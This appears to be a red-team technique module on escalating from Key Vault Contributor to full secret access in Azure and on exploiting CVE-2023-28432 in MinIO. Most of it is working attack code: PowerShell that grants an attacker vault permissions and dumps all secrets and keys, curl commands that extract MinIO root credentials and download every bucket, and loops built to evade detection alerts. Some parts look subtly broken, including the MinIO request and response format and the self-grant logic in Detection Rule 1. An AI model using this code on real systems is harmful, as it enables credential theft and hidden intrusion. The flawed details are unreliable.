# REC-CLOUD-007: Azure Key Vault Access Enumeration

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-CLOUD-007 |
| **Technique Name** | Azure Key Vault access enumeration |
| **MITRE ATT&CK ID** | T1552.001 – Unsecured Credentials: Files; T1528 – Steal Application Access Token |
| **CVE** | CVE-2023-28432 (MinIO environment variables disclosure) |
| **Platform** | Microsoft Azure Key Vault / Entra ID |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | MEDIUM (audit logging not default; access policy changes logged) |
| **Requires Authentication** | Yes (RBAC role or access policy permission) |
| **Applicable Versions** | All Azure Key Vaults; MinIO versions RELEASE.2019-12 through RELEASE.2023-03 |
| **Last Verified** | December 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

Azure Key Vault access enumeration exploits a critical architectural confusion between two parallel access models—Azure RBAC and vault-specific access policies—enabling attackers with limited permissions (Key Vault Contributor role) to escalate privileges and exfiltrate sensitive data including API keys, database passwords, SAS tokens, and authentication certificates. Combined with CVE-2023-28432 (MinIO environment variables disclosure), organizations using legacy access policies face compounded risk of complete credential exposure.

**Critical Threat Characteristics:**
- **Dual access models**: RBAC and access policies operate in parallel; RBAC can be bypassed via policy manipulation
- **Key Vault Contributor confusion**: Role is not intended to grant data access but can via access policies
- **No logging by default**: Diagnostic logs must be explicitly enabled; queries without logs go undetected
- **Long-lived credentials**: Secrets in vaults often rotate less frequently than user passwords
- **Supply chain exposure**: Secrets shared across multiple applications/services = blast radius
- **MinIO vulnerability**: Unpatched MinIO clusters leak all environment variables including master credentials

**Business Impact:**
- Unauthorized access to application secrets (API keys, database credentials)
- Data exfiltration via stolen storage account SAS tokens
- Privilege escalation to cloud infrastructure via stolen certificates
- Lateral movement across applications sharing secrets
- Regulatory violations (GDPR, HIPAA, SOC2) from unsecured credential exposure
- Supply chain compromise (shared secrets across supplier/vendor apps)

---

## 3. TECHNICAL PREREQUISITES

### Required Knowledge
- Understanding of Azure RBAC roles and permission models
- Familiarity with Key Vault access policies (legacy) vs. RBAC (modern)
- Knowledge of secret types (API keys, certificates, SAS tokens)
- Awareness of Azure role assignments and escalation vectors
- Understanding of MinIO cluster deployments (if applicable)

### Required Tools
- Valid Azure credentials with Key Vault access
- Azure Portal or Azure CLI for enumeration
- Microsoft Graph PowerShell Module (optional)
- Log Analytics/Sentinel for monitoring (optional)
- MinIO bootstrap endpoint for CVE-2023-28432 exploitation

### System Requirements
- Outbound HTTPS access to Azure APIs (vault.azure.net)
- Azure subscription with Key Vault resource
- Optional: Sentinel workspace for audit log correlation

---

## 4. DETAILED EXECUTION

### Method 1: Key Vault Enumeration via Portal

**Objective:** Interactive discovery of key vaults and secrets.

```
# Step 1: Open Azure Portal
https://portal.azure.com

# Step 2: Search for Key Vault
Search bar → "Key Vaults"

# Step 3: List all vaults accessible
View all key vaults (filtered by subscription/resource group)

# Step 4: Click vault to view properties
- Vault name
- Resource group
- Location
- Access control model (RBAC vs. Access Policies)
- Current user's permissions

# Step 5: Check access model
Click "Access Control (IAM)" tab:
- If "Access Policies" button available = vault using legacy model
- If "Role Assignments" tab = vault using RBAC model

# Step 6: View current secrets (if access granted)
Left panel → "Secrets"
Lists all secrets in vault (names visible; values hidden until clicked)

# Step 7: Check access policies (if applicable)
Click "Access Policies" tab
Shows all identities with vault access and their permissions

# Step 8: Attempt to access secret value
Click secret name → Click "Current Version"
If user has "Get" permission: Secret value displayed
If denied: Access denied error shown

# Step 9: Identify overprivileged identities
Review access policy grants:
- "Get" + "List" + "Set" on Secrets = HIGH RISK if user not intended
- "Get" + "Delete" on Secrets = CRITICAL (can destroy data)
```

**Key Findings:**
- All secret names (even without access to values)
- All identities with vault access
- Permissions granted to each identity
- Access model (legacy vs. RBAC)

---

### Method 2: Privilege Escalation via Access Policy (Contributor Role)

**Objective:** Escalate from Key Vault Contributor to secret access.

```powershell
# Prerequisites:
# - User has "Key Vault Contributor" RBAC role on vault
# - Vault uses Access Policies (not RBAC)
# - Contributor role includes Microsoft.KeyVault/vaults/write permission

# Step 1: Authenticate as compromised account
Connect-AzAccount

# Step 2: Verify current role
$roleAssignment = Get-AzRoleAssignment -SignInName "user@company.com" -RoleDefinitionName "Key Vault Contributor"

# Step 3: Get target Key Vault
$vault = Get-AzKeyVault -VaultName "target-vault"

# Step 4: Get current access policies
$policies = $vault.AccessPolicies

# Step 5: Create new access policy granting self all permissions
$newPolicy = @{
    VaultName = $vault.VaultName
    ResourceGroupName = $vault.ResourceGroupName
    ObjectId = (Get-AzADUser -SignInName "attacker@company.com").Id  # Attacker's object ID
    PermissionsToSecrets = @("Get", "List", "Set", "Delete")
    PermissionsToCertificates = @("Get", "List", "Create", "Delete")
    PermissionsToKeys = @("Get", "List", "Create", "Delete")
}

# Step 6: Add self to access policy
Set-AzKeyVaultAccessPolicy @newPolicy

# Step 7: Verify new permissions
Get-AzKeyVault -VaultName "target-vault" | Select-Object -ExpandProperty AccessPolicies

# Step 8: Now access all secrets
$secrets = Get-AzKeyVaultSecret -VaultName "target-vault"

foreach ($secret in $secrets) {
    $secretValue = Get-AzKeyVaultSecret -VaultName "target-vault" -Name $secret.Name -AsPlainText
    Write-Host "Secret: $($secret.Name) = $secretValue"
}

# Step 9: Access all keys
$keys = Get-AzKeyVaultKey -VaultName "target-vault"
foreach ($key in $keys) {
    $keyValue = Get-AzKeyVaultKey -VaultName "target-vault" -Name $key.Name
    Write-Host "Key: $($key.Name) = $($keyValue.Key.JsonWebKey)"
}

# Result: Complete access to all vault secrets despite RBAC denying it
```

**Impact:**
- API keys for third-party services
- Database connection strings
- Storage account SAS tokens
- Encryption certificates
- SSH private keys

---

### Method 3: CVE-2023-28432 MinIO Secret Disclosure

**Objective:** Exploit vulnerable MinIO cluster to extract environment variables.

```bash
# Prerequisites:
# - Target MinIO cluster running RELEASE.2019-12 through RELEASE.2023-03
# - MinIO API endpoint accessible
# - Bootstrap endpoint enabled (default)

# Step 1: Identify MinIO endpoint
# Check for responses indicating MinIO (header "Server: MinIO")
curl -I https://minio-cluster.company.com:9000

# Step 2: Send bootstrap verification request
curl -X GET "https://minio-cluster.company.com:9000/minio/bootstrap/v1/verify" \
  -H "Content-Type: application/json"

# Step 3: Parse response (if vulnerable)
# Response contains JSON with system configuration:
# {
#   "Version": "RELEASE.2023-01-01T00-00-00Z",
#   "Config": {
#     "Environment": {
#       "MINIO_ROOT_USER": "minioadmin",
#       "MINIO_ROOT_PASSWORD": "insecure-password-here",
#       "MINIO_SECRET_KEY": "secret-key-value",
#       ...
#     }
#   }
# }

# Step 4: Extract credentials
MINIO_USER=$(curl -s "https://minio-cluster.company.com:9000/minio/bootstrap/v1/verify" | jq '.Config.Environment.MINIO_ROOT_USER' -r)
MINIO_PASS=$(curl -s "https://minio-cluster.company.com:9000/minio/bootstrap/v1/verify" | jq '.Config.Environment.MINIO_ROOT_PASSWORD' -r)

# Step 5: Authenticate to MinIO with stolen credentials
export AWS_ACCESS_KEY_ID=$MINIO_USER
export AWS_SECRET_ACCESS_KEY=$MINIO_PASS

# Step 6: List all S3 buckets
aws s3 ls --endpoint-url https://minio-cluster.company.com:9000

# Step 7: Download all buckets/objects
aws s3 cp s3://bucket-name/ ./ --recursive --endpoint-url https://minio-cluster.company.com:9000

# Result: Complete access to all MinIO cluster data
# Impact: All encrypted objects, database backups, private keys accessible
```

**Risk Assessment:**
- MinIO often used for: database backups, encrypted archives, private keys
- Stolen credentials enable administrator-level access
- No MFA protection on root credentials
- Cluster-wide compromise (all objects affected)

---

### Method 4: Mass Secret Retrieval Detection Evasion

**Objective:** Extract secrets while avoiding detection alerts.

```powershell
# Standard approach (DETECTED: >25 gets in short window alerts)
foreach ($secret in (Get-AzKeyVaultSecret -VaultName $vault)) {
  Get-AzKeyVaultSecret -VaultName $vault -Name $secret.Name -AsPlainText
}

# OPSEC Evasion Approach 1: Spread over time
$secrets = Get-AzKeyVaultSecret -VaultName $vault
foreach ($secret in $secrets) {
  Get-AzKeyVaultSecret -VaultName $vault -Name $secret.Name -AsPlainText
  Start-Sleep -Seconds 30  # Space out requests (avoid 25+ in 5 minutes)
}

# OPSEC Evasion Approach 2: Use different accounts
foreach ($secret in $secrets) {
  Connect-AzAccount -Identity  # Switch to managed identity
  Get-AzKeyVaultSecret -VaultName $vault -Name $secret.Name
  Disconnect-AzAccount
  
  Connect-AzAccount -AccountId "other-user@company.com"  # Switch to different user
  Get-AzKeyVaultSecret -VaultName $vault -Name $secret.Name
  Disconnect-AzAccount
}

# OPSEC Evasion Approach 3: Add/remove access policy quickly
Set-AzKeyVaultAccessPolicy -VaultName $vault -ObjectId $attacker -PermissionsToSecrets Get, List
$secrets = @()
foreach ($secret in (Get-AzKeyVaultSecret -VaultName $vault)) {
  $secrets += Get-AzKeyVaultSecret -VaultName $vault -Name $secret.Name -AsPlainText
}
Remove-AzKeyVaultAccessPolicy -VaultName $vault -ObjectId $attacker  # Remove within 2 minutes

# Investigators see: policy added, removed; may miss actual secret retrieval
```

---

## 5. DETECTION & INCIDENT RESPONSE

### Detection Rule 1: Access Policy Privilege Escalation

```kusto
AzureDiagnostics
| where ResourceType == "VAULTS"
| where OperationName == "VaultAccessPolicyChange"
| extend NewPolicy = tostring(parse_json(properties_s).newAccessPolicy)
| where NewPolicy contains "Get" and NewPolicy contains "List"
| where NewPolicy contains properties_s  // User granting to themselves
| extend AlertSeverity = "High"
```

### Detection Rule 2: Mass Secret Retrieval

```kusto
AzureDiagnostics
| where ResourceType == "VAULTS"
| where OperationName == "SecretGet"
| summarize SecretCount = dcount(id_s) by CallerIPAddress, identity_claim_oid_g, bin(TimeGenerated, 5m)
| where SecretCount > 25  // Threshold: >25 distinct secrets in 5 minutes
| extend AlertSeverity = "High"
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Migrate All Key Vaults to RBAC**
- Audit all vaults currently using Access Policies
- Create migration plan (phased approach)
- Assign granular RBAC roles (Key Vault Data Reader, Officer, Admin)
- Document business justification for each role assignment
- Validate: RBAC-only vaults prevent access policy bypasses

**Audit Key Vault Contributor Assignments**
- List all users/groups with Contributor role
- Validate business need (should be rare)
- Recommend migration to RBAC-specific roles (e.g., Key Vault Administrator, Data Officer)
- Revoke unnecessary Contributor assignments

### Priority 2: HIGH

**Enable Diagnostic Logging**
- Enable audit logs for all Key Vaults
- Export to Log Analytics workspace
- Configure Sentinel alert rules for suspicious operations

**Monitor Access Policy Changes**
- Alert on: VaultAccessPolicyChange operations
- Alert on: New access policy grants
- Alert on: Policy removals (indicates cover-up)

**Implement Conditional Access**
- Restrict Key Vault access from external networks
- Require MFA for high-risk operations (SecretDelete, SecretSet)
- Block legacy authentication methods

---

## 7. COMPLIANCE MAPPING

| Standard | Requirement | KV Mitigation |
|----------|-------------|---------------|
| **NIST 800-53** | SC-7 (Boundary Protection), SC-28 (Protection of Information at Rest) | RBAC + audit logging |
| **GDPR** | Article 32 (Security Measures) | Encryption + access control + monitoring |
| **SOC2** | Credential management, audit logging | RBAC + full audit trail |

---

## 8. REFERENCES

1. **Azure Key Vault Security:**
   - Datadog Security Research: Escalating privileges via access policies (December 2024)
   - Microsoft: RBAC guide for Key Vault (2025)
   - GitHub: KQL hunting queries for KV privilege escalation

2. **CVE-2023-28432:**
   - SentinelOne analysis
   - GreyNoise threat intelligence
   - GitHub: POC exploit code

3. **Detection & Monitoring:**
   - Microsoft Sentinel Key Vault solution pack
   - Stefan Pems: Security Monitoring MHSM with Sentinel

---
